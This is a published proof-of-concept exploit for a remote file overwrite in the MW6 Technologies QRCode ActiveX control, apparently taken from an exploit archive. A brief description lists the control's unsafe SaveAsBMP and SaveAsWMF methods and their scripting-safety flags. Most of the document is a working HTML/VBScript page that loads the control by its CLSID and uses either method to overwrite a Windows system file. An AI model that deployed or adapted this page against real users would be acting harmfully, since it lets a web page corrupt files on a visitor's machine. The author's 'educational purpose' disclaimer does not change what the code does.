<pre>
<code><span style="font: 10pt Courier New;"><span 
class="general1-symbol"><body 
bgcolor="#E0E0E0">-----------------------------------------------------------------------------
 <b>MW6 Technologies QRCode ActiveX 3.0 (MW6QRCode.dll) Remote File 
Overwrite</b>
 url: www.mw6tech.com

 Author: shinnai
 mail: shinnai[at]autistici[dot]org
 site: http://shinnai.altervista.org

 This was written for educational purpose. Use it at your own risk.
 Author will be not responsible for any damage.

 Tested on Windows XP Professional SP2 all patched, with Internet 
Explorer 7

 <b>Description:
 This control contains two methods, "SaveAsBMP()" and "SaveAsWMF()", 
which
 write to a file specified as an argument.
 These can be exploited to overwrite and corrupt arbitrary files on the
 system in the context of the currently logged-on user.

 Marked as:
 RegKey Safe for Script: False
 RegKey Safe for Init: False
 Implements IObjectSafety: True
 IDisp Safe: Safe for untrusted: caller,data
 IPersist Safe: Safe for untrusted: caller,data
 IPStorage Safe: Safe for untrusted: caller,data
 KillBitSet: Falso</b> 
-----------------------------------------------------------------------------
<object classid='clsid:3BB56637-651D-4D1D-AFA4-C0506F57EAF8' id='test' 
width='24' height='24'></object>

<select style="width: 404px" name="Pucca">
  <option value = "SaveAsBMP">SaveAsBMP</option>
  <option value = "SaveAsWMF">SaveAsWMF</option>

</select>

<input language=VBScript onclick=tryMe() type=button value="Click here 
to start the test">

<script language='vbscript'>
 Sub tryMe
  on error resume next
   Dim MyMsg
   if Pucca.value = "SaveAsBMP" then
     test.SaveAsBMP "c:\windows\system_.ini"
     MsgBox "Exploit completed."
   elseif Pucca.value = "SaveAsWMF" then
     test.SaveAsWMF "c:\windows\system_.ini"
     MsgBox "Exploit completed."
   end if
 End Sub
</script>
</span></span>
</code></pre>

